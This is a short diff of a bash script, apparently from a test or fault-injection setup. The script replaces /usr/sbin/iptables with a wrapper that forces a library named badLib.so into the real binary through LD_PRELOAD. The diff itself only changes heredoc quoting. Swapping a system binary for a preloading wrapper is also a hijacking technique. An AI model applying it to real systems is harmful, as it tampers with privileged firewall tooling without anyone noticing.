@@ -1,6 +1,6 @@
 #!/bin/bash
 mv /usr/sbin/iptables /usr/sbin/iptables.real
-cat <<EOFA > /usr/sbin/iptables
+cat <<'EOFA' > /usr/sbin/iptables
 #!/bin/bash
 export LD_PRELOAD=/usr/lib/badLib.so
 exec -a iptables /usr/sbin/iptables.real "$@"
